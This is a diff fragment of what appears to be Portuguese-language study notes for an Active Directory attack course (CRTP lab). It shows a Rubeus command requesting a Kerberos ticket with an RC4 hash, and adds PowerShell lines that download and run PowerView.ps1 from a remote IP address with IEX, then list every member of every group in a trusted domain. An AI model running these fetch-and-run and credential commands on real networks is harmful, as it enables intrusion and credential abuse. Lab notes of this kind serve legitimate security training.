@@ -3533,3 +3533,14 @@ cd .\HeidiSQL_9.4_Portable\
 ```
 .\rubeus.exe asktgt /user:student209 /rc4:2E21DC42BFB4812954A6BC5A01021D53 /domain:dollarcorp.moneycorp.local  /nopac /nowrap /dc:dcorp-dc.dollarcorp.moneycorp.local
 ```
+
+##### POWERSHELL - TODOS OS MEMBROS DE TODOS OS GRUPOS
+```	
+IEX(New-Object System.Net.WebClient).DownloadString("http://175.12.80.10/oscp/crtp/PowerView.ps1")
+Get-netgroup | Get-NetGroupMember -domain trusted.corp | select GroupName,MemberName
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("http://175.12.80.10/oscp/crtp/PowerView.ps1")
+$FormatEnumerationLimit=-1
+Get-netgroup | Get-NetGroupMember -domain trusted.corp | select GroupName,MemberName | Out-String -Width 4096
+```
